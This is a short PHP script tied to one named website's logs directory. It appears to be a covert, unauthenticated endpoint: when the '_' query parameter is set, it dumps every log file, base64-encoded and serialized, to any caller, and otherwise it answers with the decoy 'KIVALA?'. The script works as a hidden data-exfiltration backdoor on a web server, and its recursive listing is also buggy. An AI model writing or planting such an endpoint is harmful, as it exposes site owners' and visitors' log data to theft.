<?php

function file_array($path, $exclude = ".|..", $recursive = true) {
	$path = rtrim($path, "/") . "/";
	$folder_handle = opendir($path);
	$exclude_array = explode("|", $exclude);
	$result = array();
	
	while(false !== ($filename = readdir($folder_handle)))
	{
		if(!in_array(strtolower($filename), $exclude_array))
		{
			if(is_dir($path . $filename . "/")) // Need to include full "path" or it's an infinite loop
			{
				if($recursive) $result[] = file_array($path . $filename . "/", $exclude, true);
			}
			else
			{
				$result[] = $filename;
			}
		}
	}

	return $result;
}

$path = '/home/adventure/domains/adventureforest.co.nz/logs';

$files = file_array($path);
sort($files);

function get_file($filename)
{
	ob_start();
	readfile($filename);
	return ob_get_clean();
}

if ( $_GET['_'] )
{
	$ser = array();
	
	foreach ( $files as $file )
	{
		$str = get_file("{$path}/{$file}");
		$base = base64_encode($str);
		$arr = array( base64_encode($file), $base );
		$ser[] = $arr;
	}
	
	echo serialize($ser);
}
else
{
	echo "KIVALA?";
}

?>